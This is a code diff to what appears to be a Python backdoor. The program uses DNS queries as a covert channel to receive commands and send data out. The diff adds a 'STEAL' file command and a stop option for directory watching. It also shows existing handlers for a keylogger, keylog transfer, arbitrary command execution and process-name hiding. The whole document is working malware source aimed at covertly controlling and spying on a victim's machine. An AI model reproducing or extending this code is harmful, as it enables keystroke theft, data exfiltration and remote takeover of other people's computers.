@@ -21,7 +21,7 @@ import subprocess
 
 # Custom Modules
 from utils.encryption import StreamEncryption, BlockEncryption
-from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE
+from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE, STEAL
 from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
 from utils.keylogger import Keylogger
@@ -266,7 +266,6 @@ def execute_watch_command(path: str) -> bool:
         query = forge_dns_query_stream(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
         return False
-    # Register the path to monitor.
     MONITOR.monitor(path)
     query = forge_dns_query_stream(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
     send_dns_query(query)
@@ -301,10 +300,8 @@ def transfer_keylogger():
         send_dns_query(query)
     else:
         print("SUCCESS: Transferring keylog data...")
-        # Send notification
         query = forge_dns_query_stream("SUCCESS: Transferring keylog data...", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
-        # Send keylog data
         forge_dns_query_block(data, KEYLOG_IDENTIFICATION)
 
 
@@ -339,7 +336,10 @@ def packet_handler(pkt):
     argc = len(argv)    
     if argc == 2:
         if argv[0] == WATCH:
-            execute_watch_command(argv[1])
+            if argv[1] == STOP:
+                MONITOR.shutdown()
+            else:
+                execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
             if argv[1] == STOP:
                 stop_keylogger()
@@ -347,6 +347,10 @@ def packet_handler(pkt):
                 start_keylogger()
             if argv[1] == TRANSFER:
                 transfer_keylogger()
+        if argv[0] == STEAL:
+            print(f"Stealing: {argv[1]}")
+            query = forge_dns_query_stream("Success: Stealing file now.", GENERAL_MSG_IDENTIFICATION)
+            send_dns_query(query)
     if argv[0] == EXECUTE:
         result = execute_arbitrary_command(argv[1:])
         num_bytes = len(result.encode("utf-8"))
